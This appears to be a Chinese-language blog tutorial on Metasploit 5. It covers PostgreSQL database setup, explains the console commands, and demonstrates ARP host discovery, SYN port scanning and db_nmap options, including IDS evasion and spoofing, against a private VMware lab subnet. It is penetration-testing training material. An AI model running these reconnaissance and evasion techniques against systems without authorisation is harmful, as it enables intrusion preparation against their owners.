+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Display the Framework log using the log command, learn more with help log

[*] Starting persistent handler(s)...
msf5 &gt; 
msf5 &gt; db_status 
[*] Connected to msf. Connection type: postgresql.
msf5 &gt; </code></pre><p>如果要设置自动登录，需要修改配置文件<code>/usr/share/metasploit-framework/config/database.yml</code>，默认初始化已经配置好了。</p>
<pre><code>production:
  adapter: postgresql
  database: msf
  username: msf
  password: n1CV4/9NcMUEvg4x90GhPOV6EfPBX/Ai7gY1a2fNdZQ=
  host: localhost
  port: 5432
  pool: 5
  timeout: 5</code></pre><h4 id="手工配置连接数据库"><a href="#手工配置连接数据库" class="headerlink" title="手工配置连接数据库"></a>手工配置连接数据库</h4><ul>
<li>启动postgresql数据库服务</li>
</ul>
<pre><code> → Qftm :~/Desktop# service postgresql status
● postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)
     Active: inactive (dead)
 → Qftm :~/Desktop# service postgresql start
 → Qftm :~/Desktop# service postgresql status
● postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)
     Active: active (exited) since Wed 2020-06-24 03:24:56 EDT; 3s ago
    Process: 4575 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
   Main PID: 4575 (code=exited, status=0/SUCCESS)

Jun 24 03:24:56 Pentesting systemd[1]: Starting PostgreSQL RDBMS...
Jun 24 03:24:56 Pentesting systemd[1]: Started PostgreSQL RDBMS.
 → Qftm :~/Desktop#</code></pre><ul>
<li>进入postgresql配置</li>
</ul>
<p>设置数据库账户密码：<code>postgres:adminp</code></p>
<pre><code> → Qftm :~/Desktop# sudo -u postgres psql
sudo: unable to resolve host Pentesting: Name or service not known
psql (12.1 (Debian 12.1-2))
Type &quot;help&quot; for help.

postgres=# alter user postgres password &#39;adminp&#39;;
ALTER ROLE
postgres=# \q
 → Qftm :~/Desktop#</code></pre><ul>
<li>设置账户认证方式</li>
</ul>
<pre><code> → Qftm :~/Desktop# mousepad /etc/postgresql/12/main/postgresql.conf 
password_encryption = md5        # md5 or scram-sha-256
 → Qftm :~/Desktop#</code></pre><ul>
<li>重启数据库服务</li>
</ul>
<pre><code> → Qftm :~/Desktop# service postgresql restart
 → Qftm :~/Desktop# service postgresql status
● postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)
     Active: active (exited) since Wed 2020-06-24 03:35:54 EDT; 4s ago
    Process: 4734 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
   Main PID: 4734 (code=exited, status=0/SUCCESS)

Jun 24 03:35:54 Pentesting systemd[1]: Starting PostgreSQL RDBMS...
Jun 24 03:35:54 Pentesting systemd[1]: Started PostgreSQL RDBMS.
 → Qftm :~/Desktop# </code></pre><ul>
<li>连接数据库</li>
</ul>
<pre><code> → Qftm :~/Desktop# psql -U postgres -h 127.0.0.1
Password for user postgres: 
psql (12.1 (Debian 12.1-2))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type &quot;help&quot; for help.

postgres=#</code></pre><ul>
<li>新建数据库</li>
</ul>
<pre><code>postgres=# create user msf with password &#39;adminp&#39; createdb;
ERROR:  role &quot;msf&quot; already exists
postgres=# 
postgres=# create database msf with owner=msf;
ERROR:  database &quot;msf&quot; already exists
postgres=# </code></pre><ul>
<li>msf连接配置</li>
</ul>
<p>启动msf控制台，输入<code>db_status</code>查看数据库连接状态</p>
<pre><code> → Qftm :~/Desktop# msfconsole 


      .:okOOOkdc&#39;           &#39;cdkOOOko:.                                                                                        
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.                                                                                      
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:                                                                                     
  &#39;OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO&#39;                                                                                    
  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo                                                                                    
  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx                                                                                    
  lOOOOOOOO.         ;d;         ,OOOOOOOOl                                                                                    
  .OOOOOOOO.   .;           ;    ,OOOOOOOO.                                                                                    
   cOOOOOOO.   .OOc.     &#39;oOO.   ,OOOOOOOc                                                                                     
    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo                                                                                      
     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl                                                                                       
      ;OOOO&#39;   .OOOO.   :OOOO.   ;OOOO;                                                                                        
       .dOOo   .OOOOocccxOOOO.   xOOd.                                                                                         
         ,kOl  .OOOOOOOOOOOOO. .dOk,                                                                                           
           :kk;.OOOOOOOOOOOOO.cOk:                                                                                             
             ;kOOOOOOOOOOOOOOOk:                                                                                               
               ,xOOOOOOOOOOOx,                                                                                                 
                 .lOOOOOOOl.                                                                                                   
                    ,dOd,                                                                                                      
                      .                                                                                                        

       =[ metasploit v5.0.93-dev                          ]
+ -- --=[ 2029 exploits - 1100 auxiliary - 344 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Display the Framework log using the log command, learn more with help log

[*] Starting persistent handler(s)...
msf5 &gt; db_status 
[*] Connected to msf. Connection type: postgresql.
msf5 &gt; </code></pre><p>可以看到数据库已经自动连接上了，如果没有，就需要手动输入以下命令连接</p>
<pre><code>msf5 &gt; db_connect msf:adminp@127.0.0.1/msf</code></pre><p>notes</p>
<pre><code>msf：数据库名
adminp：密码
@：固定格式
127.0.0.1：登录地址</code></pre><p>如果要设置自动登录，需要修改配置文件<code>/usr/share/metasploit-framework/config/database.yml</code></p>
<pre><code>production:
  adapter: postgresql
  database: msf
  username: msf
  password: n1CV4/9NcMUEvg4x90GhPOV6EfPBX/Ai7gY1a2fNdZQ=
  host: localhost
  port: 5432
  pool: 5
  timeout: 5</code></pre><h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><h3 id="启动msf"><a href="#启动msf" class="headerlink" title="启动msf"></a>启动msf</h3><pre class="line-numbers language-bash"><code class="language-bash"> → Qftm :~/Desktop<span class="token comment" spellcheck="true"># msfconsole </span>

 _                                                    _
/ \    /\         __                         _   __  /_/ __
<span class="token operator">|</span> <span class="token operator">|</span>\  / <span class="token operator">|</span> _____   \ \           ___   _____ <span class="token operator">|</span> <span class="token operator">|</span> /  \ _   \ \
<span class="token operator">|</span> <span class="token operator">|</span> \/<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> ___\ <span class="token operator">|</span>- -<span class="token operator">|</span>   /\    / __\ <span class="token operator">|</span> -__/ <span class="token operator">|</span> <span class="token operator">||</span> <span class="token operator">|</span> <span class="token operator">||</span> <span class="token operator">|</span> <span class="token operator">|</span>- -<span class="token operator">|</span>
<span class="token operator">|</span>_<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> _<span class="token operator">|</span>__  <span class="token operator">|</span> <span class="token operator">|</span>_  / -\ __\ \   <span class="token operator">|</span> <span class="token operator">|</span>    <span class="token operator">|</span> <span class="token operator">|</span> \__/<span class="token operator">|</span> <span class="token operator">|</span>  <span class="token operator">|</span> <span class="token operator">|</span>_
      <span class="token operator">|</span>/  <span class="token operator">|</span>____/  \___\/ /\ \\___/   \/     \__<span class="token operator">|</span>    <span class="token operator">|</span>_\  \___\


       <span class="token operator">=</span><span class="token punctuation">[</span> metasploit v5.0.93-dev                          <span class="token punctuation">]</span>
+ -- --<span class="token operator">=</span><span class="token punctuation">[</span> 2029 exploits - 1100 auxiliary - 344 post       <span class="token punctuation">]</span>
+ -- --<span class="token operator">=</span><span class="token punctuation">[</span> 562 payloads - 45 encoders - 10 nops            <span class="token punctuation">]</span>
+ -- --<span class="token operator">=</span><span class="token punctuation">[</span> 7 evasion                                       <span class="token punctuation">]</span>

Metasploit tip: Open an interactive Ruby terminal with irb

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting persistent handler<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">..</span>.
msf5 <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="命令解读"><a href="#命令解读" class="headerlink" title="命令解读"></a>命令解读</h3><ul>
<li>MSF Console Command</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">msf5 <span class="token operator">></span> <span class="token function">help</span>

Core Commands
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

    Command       Description
    -------       -----------
    ?             帮助手册
    banner        展示Metasploit框架信息
    <span class="token function">cd</span>            改变当前工作目录
    color         切换颜色（true<span class="token operator">|</span><span class="token boolean">false</span><span class="token operator">|</span>auto）
    connect       远程连接-与主机通信
    <span class="token keyword">exit</span>          退出Metasploit终端控制台
    get           获取特定上下文变量的值
    getg          获取一个全局变量的值
    <span class="token function">grep</span>          grep另一个命令的输出
    <span class="token function">help</span>          帮助手册
    <span class="token function">history</span>       查看Metasploit控制台中使用过的历史命令
    load          加载框架中的插件
    quit          退出Metasploit终端控制台
    repeat        Repeat a list of commands
    route         Route traffic through a session
    save          保存活动的数据存储
    sessions      显示会话列表和有关会话的信息（sessions -h      列出sessions命令的帮助信息
                                           sessions -i      查看所有的会话（基本信息）
                                           sessions -v      列出所有可用交互会话及会话详细信息
                                           sessions -i <span class="token function">id</span>   通过 ID 号，进入某一个交互会话
                                           <span class="token keyword">exit</span>             直接退出会话
                                           background       将会话隐藏在后台
                                           sessions -K      杀死所有存活的交互会话）
    <span class="token keyword">set</span>           设置一个特定的上下文变量（选项）的值
    setg          设置一个全局变量的值
    <span class="token function">sleep</span>         Do nothing <span class="token keyword">for</span> the specified number of seconds
    spool         Write console output into a <span class="token function">file</span> as well the <span class="token function">screen</span>
    threads       查看和操作后台线程
    tips          Show a list of useful productivity tips
    unload        卸载已加载框架插件
    unset         取消设置的一个或多个特定的上下文变量
    unsetg        取消设置的一个或多个全局变量的
    version       查看框架和控制台库版本号


Module Commands
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

    Command       Description
    -------       -----------
    advanced      显示一个或多个模块的高级（详细）选项
    back          从当前上下文返回（退出当前正在使用的模块，返回原始控制台（模块的配置依然有效））
    clearm        清除该模块的堆栈信息
    info          显示有关一个或多个模块的信息
    listm         显示该模块的堆栈信息
    loadpath      从路径搜索并加载模块
    options       显示一个或多个模块的全局选项信息（option<span class="token operator">|</span>show option）
    popm          将最新模块弹出堆栈并使其激活
    previous      将先前加载的模块设置为当前模块
    pushm         将活动模块或模块列表推入模块堆栈
    reload_all    从所有定义的模块路径重新加载所有模块
    search        搜索相关模块的名称和描述（search cve:2009 type:exploit platform:-linux）
    show          查看显示给定类型的模块，或所有模块（show exploits<span class="token operator">|</span>post<span class="token operator">|</span>nop<span class="token punctuation">..</span>.）
    use           装载一个渗透攻击或者模块
                    （use ModuleName    use exploit/windows/smb/ms17_010_eternalblue
                      info              查看模块的详细信息
                      options           查看脚本配置选项
                      show options        查看脚本配置选项
                      show targets      显示适用的主机类型
                      <span class="token keyword">set</span>               设置模块选项
                      run                启动脚本
                      exploit           启动脚本）


Job Commands（作业<span class="token operator">==</span>运行的模块）
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

    Command       Description
    -------       -----------
    handler       启动有效负载处理程序作为作业进程
    <span class="token function">jobs</span>          查看和管理作业进程（查看和管理当前运行的模块）
    <span class="token function">kill</span>          关闭<span class="token operator">|</span>杀死一个作业进程
    rename_job    重命名作业进程


Resource Script Commands
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

    Command       Description
    -------       -----------
    makerc        将启动控制台以后要输入的命令保存到文件中（批处理文件）
    resource      运行存储在文件中的命令（运行批处理文件）


Database Backend Commands
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

    Command           Description
    -------           -----------
    analyze           分析有关特定地址或地址范围的数据库信息
    db_connect        连接到现有的数据库服务（db_connect msf:adminp@127.0.0.1/msf）
    db_disconnect     断开当前数据库服务
    db_export         导出包含数据库内容的文件
    db_import         导入扫描结果文件（将自动检测文件类型）
    db_nmap           执行nmap并自动记录输出到数据库中（集成的nmap，对nmap的一个封装）
    db_rebuild_cache  重建数据库存储的模块缓存（不建议使用）
    db_remove         删除保存的数据库服务条目
    db_save           将当前数据库服务连接保存为默认值，以便在启动时重新连接
    db_status         显示当前数据库服务状态
    hosts             列出数据库中的所有主机
    loot              列出数据库中的所有战利品
    notes             列出数据库中的所有注释
    services          列出数据库中的所有服务
    vulns             列出数据库中的所有漏洞
    workspace         在数据库工作区之间切换


Credentials Backend Commands
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

    Command       Description
    -------       -----------
    creds         列出数据库中的所有凭据


Developer Commands
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

    Command       Description
    -------       -----------
    edit          使用首选编辑器编辑当前模块或文件
    irb           在当前上下文中打开一个交互式Ruby Shell
    log           如果可能，将framework.log显示到页面末尾（查看日志信息）
    pry           在当前模块或框架上打开Pry调试器
    reload_lib    从指定路径重新加载Ruby库文件
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>MSF Console Module Command</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">msf5 auxiliary<span class="token punctuation">(</span>xxx/xxx/xxx<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token function">help</span>

Auxiliary Commands
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

    Command       Description
    -------       -----------
    check         检查目标是否存在漏洞
    exploit       run命令的别名
    rcheck        重新加载该辅助模块并检查目标是否存在漏洞
    recheck       rcheck命令的别名
    reload        重新加载该辅助模块（已配置的选项还在）
    rerun         重新加载该辅助模块并运行该模块
    rexploit      rerun命令的别名
    run           运行选中的辅助模块

msf5 exploit<span class="token punctuation">(</span>xxx/xxx/xxx<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token function">help</span>

Exploit Commands
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

    Command       Description
    -------       -----------
    check         检查目标是否存在漏洞
    exploit       对目标发起攻击
    rcheck        重新加载该辅助模块并检查目标是否存在漏洞
    recheck       rcheck命令的别名
    reload        重新加载该渗透攻击模块（已配置的选项还在）
    rerun         rexploit命令的别名
    rexploit      重新加载该渗透攻击模块并运行该模块对目标发起攻击
    run           exploit命令的别名

msf5 payload<span class="token punctuation">(</span>xxx/xxx/xxx<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token function">help</span>

Payload Commands
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

    Command       Description
    -------       -----------
    check         检查目标是否存在漏洞
    generate      Generates a payload
    reload        从磁盘重新加载当前模块
    to_handler    创建具有指定有效负载的处理程序
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="情报搜集"><a href="#情报搜集" class="headerlink" title="情报搜集"></a>情报搜集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p>Metasploit 中提供了一些辅助模块可用于主机发现，这些模块位于<code>modules/auxiliary/scanner/discovery/</code> 目录中。</p>
<pre><code>use auxiliary/scanner/discovery/arp_sweep
use auxiliary/scanner/discovery/empty_udp
use auxiliary/scanner/discovery/ipv6_multicast_ping
use auxiliary/scanner/discovery/ipv6_neighbor
use auxiliary/scanner/discovery/ipv6_neighbor_router_advertisement
use auxiliary/scanner/discovery/udp_probe
use auxiliary/scanner/discovery/udp_sweep</code></pre><p>使用 arp 请求来枚举本地局域网中的所有活跃主机</p>
<pre><code>msf5 &gt; use auxiliary/scanner/discovery/arp_sweep 
msf5 auxiliary(scanner/discovery/arp_sweep) &gt; options 

Module options (auxiliary/scanner/discovery/arp_sweep):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   INTERFACE                   no        The name of the interface
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
   SHOST                       no        Source IP Address
   SMAC                        no        Source MAC Address
   THREADS    1                yes       The number of concurrent threads (max one per host)
   TIMEOUT    5                yes       The number of seconds to wait for new data

msf5 auxiliary(scanner/discovery/arp_sweep) &gt; set rhosts 192.33.6.0/24
rhosts =&gt; 192.33.6.0/24
msf5 auxiliary(scanner/discovery/arp_sweep) &gt; set threads 50
threads =&gt; 50
msf5 auxiliary(scanner/discovery/arp_sweep) &gt; set timeout 2
timeout =&gt; 2
msf5 auxiliary(scanner/discovery/arp_sweep) &gt; show options 

Module options (auxiliary/scanner/discovery/arp_sweep):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   INTERFACE                   no        The name of the interface
   RHOSTS     192.33.6.0/24    yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
   SHOST                       no        Source IP Address
   SMAC                        no        Source MAC Address
   THREADS    50               yes       The number of concurrent threads (max one per host)
   TIMEOUT    2                yes       The number of seconds to wait for new data

msf5 auxiliary(scanner/discovery/arp_sweep) &gt; run

[+] 192.33.6.1 appears to be up (VMware, Inc.).
[+] 192.33.6.2 appears to be up (VMware, Inc.).
[+] 192.33.6.151 appears to be up (VMware, Inc.).
[+] 192.33.6.200 appears to be up (VMware, Inc.).
[+] 192.33.6.254 appears to be up (VMware, Inc.).
[*] Scanned 256 of 256 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/discovery/arp_sweep) &gt; </code></pre><p>除了使用内置的辅助模块也可以通过控制台调用系统工具<code>netdiscover</code>来探测主机</p>
<pre><code>msf5 auxiliary(scanner/discovery/arp_sweep) &gt; netdiscover -r 192.33.6.0/24
Currently scanning: Finished!   |   Screen View: Unique Hosts   
 18 Captured ARP Req/Rep packets, from 5 hosts.   Total size: 1080   
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.33.6.1      00:50:56:c0:00:08      1      60  VMware, Inc. 
 192.33.6.2      00:50:56:f0:2a:96      5     300  VMware, Inc. 
 192.33.6.151    00:0c:29:fb:6f:2e      5     300  VMware, Inc. 
 192.33.6.200    00:0c:29:8c:0f:dd      6     360  VMware, Inc. 
 192.33.6.254    00:50:56:e3:b4:52      1      60  VMware, Inc. </code></pre><p>PS：针对内置辅助模块和系统工具扫描结果来看，后者多了一个发现主机的MAC地址信息。当然这里也可以使用<code>Nmap</code>来进行探测存活主机情况。</p>
<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>Metasploit 的辅助模块中提供了几款实用的端口扫描器。</p>
<pre><code>use auxiliary/scanner/portscan/ack        
use auxiliary/scanner/portscan/tcp
use auxiliary/scanner/portscan/ftpbounce  
use auxiliary/scanner/portscan/xmas
use auxiliary/scanner/portscan/syn</code></pre><p>一般情况下推荐使用 syn 端口扫描器，因为他的扫描速度较快，结果比较准确且不易被对方察觉。</p>
<pre><code>msf5 auxiliary(scanner/discovery/arp_sweep) &gt; back
msf5 &gt; use auxiliary/scanner/portscan/syn 
msf5 auxiliary(scanner/portscan/syn) &gt; show options 

Module options (auxiliary/scanner/portscan/syn):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to scan per set
   DELAY      0                yes       The delay between connections, per thread, in milliseconds
   INTERFACE                   no        The name of the interface
   JITTER     0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS      1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
   SNAPLEN    65535            yes       The number of bytes to capture
   THREADS    1                yes       The number of concurrent threads (max one per host)
   TIMEOUT    500              yes       The reply read timeout in milliseconds

msf5 auxiliary(scanner/portscan/syn) &gt; set rhosts 192.33.6.151
rhosts =&gt; 192.33.6.151
msf5 auxiliary(scanner/portscan/syn) &gt; set ports 1-65535
ports =&gt; 1-65535
msf5 auxiliary(scanner/portscan/syn) &gt; set threads 50
threads =&gt; 50
msf5 auxiliary(scanner/portscan/syn) &gt; show options 

Module options (auxiliary/scanner/portscan/syn):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to scan per set
   DELAY      0                yes       The delay between connections, per thread, in milliseconds
   INTERFACE                   no        The name of the interface
   JITTER     0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS      1-65535          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS     192.33.6.151     yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
   SNAPLEN    65535            yes       The number of bytes to capture
   THREADS    50               yes       The number of concurrent threads (max one per host)
   TIMEOUT    500              yes       The reply read timeout in milliseconds

msf5 auxiliary(scanner/portscan/syn) &gt; run
[+]  TCP OPEN 192.33.6.151:135
[+]  TCP OPEN 192.33.6.151:139
[+]  TCP OPEN 192.33.6.151:445
^C[*] Caught interrupt from the console...
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/portscan/syn) &gt; </code></pre><h3 id="探测服务详细信息"><a href="#探测服务详细信息" class="headerlink" title="探测服务详细信息"></a>探测服务详细信息</h3><ul>
<li>调用执行MSF封装集成的Nmap</li>
</ul>
<p>Nmap能够很好地与Metasploit渗透测试数据库集成在一起，可以方便地在Metasploit终端中使用<code>db_nmap</code>，该命令是Nmap的一个封装，与Nmap使用方法完全一致，不同的是其执行结果将自动输人到数据库中，所以要使用<code>db_nmap</code>前提需要已连接上postgresql数据库</p>
<pre><code>msf5 &gt; db_status 
[*] Connected to msf. Connection type: postgresql.
msf5 &gt; </code></pre><p>查看<code>db_nmap</code>命令帮助信息</p>
<pre><code>msf5 &gt; db_nmap -h
[*] Nmap 7.80 ( https://nmap.org )
[*] Usage: nmap [Scan Type(s)] [Options] {target specification}
[*] TARGET SPECIFICATION:
[*] Can pass hostnames, IP addresses, networks, etc.
[*] Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254
[*] -iL &lt;inputfilename&gt;: Input from list of hosts/networks
[*] -iR &lt;num hosts&gt;: Choose random targets
[*] --exclude &lt;host1[,host2][,host3],...&gt;: Exclude hosts/networks
[*] --excludefile &lt;exclude_file&gt;: Exclude list from file
[*] HOST DISCOVERY:
[*] -sL: List Scan - simply list targets to scan
[*] -sn: Ping Scan - disable port scan
[*] -Pn: Treat all hosts as online -- skip host discovery
[*] -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports
[*] -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
[*] -PO[protocol list]: IP Protocol Ping
[*] -n/-R: Never do DNS resolution/Always resolve [default: sometimes]
[*] --dns-servers &lt;serv1[,serv2],...&gt;: Specify custom DNS servers
[*] --system-dns: Use OS&#39;s DNS resolver
[*] --traceroute: Trace hop path to each host
[*] SCAN TECHNIQUES:
[*] -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
[*] -sU: UDP Scan
[*] -sN/sF/sX: TCP Null, FIN, and Xmas scans
[*] --scanflags &lt;flags&gt;: Customize TCP scan flags
[*] -sI &lt;zombie host[:probeport]&gt;: Idle scan
[*] -sY/sZ: SCTP INIT/COOKIE-ECHO scans
[*] -sO: IP protocol scan
[*] -b &lt;FTP relay host&gt;: FTP bounce scan
[*] PORT SPECIFICATION AND SCAN ORDER:
[*] -p &lt;port ranges&gt;: Only scan specified ports
[*] Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9
[*] --exclude-ports &lt;port ranges&gt;: Exclude the specified ports from scanning
[*] -F: Fast mode - Scan fewer ports than the default scan
[*] -r: Scan ports consecutively - don&#39;t randomize
[*] --top-ports &lt;number&gt;: Scan &lt;number&gt; most common ports
[*] --port-ratio &lt;ratio&gt;: Scan ports more common than &lt;ratio&gt;
[*] SERVICE/VERSION DETECTION:
[*] -sV: Probe open ports to determine service/version info
[*] --version-intensity &lt;level&gt;: Set from 0 (light) to 9 (try all probes)
[*] --version-light: Limit to most likely probes (intensity 2)
[*] --version-all: Try every single probe (intensity 9)
[*] --version-trace: Show detailed version scan activity (for debugging)
[*] SCRIPT SCAN:
[*] -sC: equivalent to --script=default
[*] --script=&lt;Lua scripts&gt;: &lt;Lua scripts&gt; is a comma separated list of
[*] directories, script-files or script-categories
[*] --script-args=&lt;n1=v1,[n2=v2,...]&gt;: provide arguments to scripts
[*] --script-args-file=filename: provide NSE script args in a file
[*] --script-trace: Show all data sent and received
[*] --script-updatedb: Update the script database.
[*] --script-help=&lt;Lua scripts&gt;: Show help about scripts.
[*] &lt;Lua scripts&gt; is a comma-separated list of script-files or
[*] script-categories.
[*] OS DETECTION:
[*] -O: Enable OS detection
[*] --osscan-limit: Limit OS detection to promising targets
[*] --osscan-guess: Guess OS more aggressively
[*] TIMING AND PERFORMANCE:
[*] Options which take &lt;time&gt; are in seconds, or append &#39;ms&#39; (milliseconds),
[*] &#39;s&#39; (seconds), &#39;m&#39; (minutes), or &#39;h&#39; (hours) to the value (e.g. 30m).
[*] -T&lt;0-5&gt;: Set timing template (higher is faster)
[*] --min-hostgroup/max-hostgroup &lt;size&gt;: Parallel host scan group sizes
[*] --min-parallelism/max-parallelism &lt;numprobes&gt;: Probe parallelization
[*] --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout &lt;time&gt;: Specifies
[*] probe round trip time.
[*] --max-retries &lt;tries&gt;: Caps number of port scan probe retransmissions.
[*] --host-timeout &lt;time&gt;: Give up on target after this long
[*] --scan-delay/--max-scan-delay &lt;time&gt;: Adjust delay between probes
[*] --min-rate &lt;number&gt;: Send packets no slower than &lt;number&gt; per second
[*] --max-rate &lt;number&gt;: Send packets no faster than &lt;number&gt; per second
[*] FIREWALL/IDS EVASION AND SPOOFING:
[*] -f; --mtu &lt;val&gt;: fragment packets (optionally w/given MTU)
[*] -D &lt;decoy1,decoy2[,ME],...&gt;: Cloak a scan with decoys
[*] -S &lt;IP_Address&gt;: Spoof source address
[*] -e &lt;iface&gt;: Use specified interface
[*] -g/--source-port &lt;portnum&gt;: Use given port number
[*] --proxies &lt;url1,[url2],...&gt;: Relay connections through HTTP/SOCKS4 proxies
[*] --data &lt;hex string&gt;: Append a custom payload to sent packets
[*] --data-string &lt;string&gt;: Append a custom ASCII string to sent packets
[*] --data-length &lt;num&gt;: Append random data to sent packets
[*] --ip-options &lt;options&gt;: Send packets with specified ip options
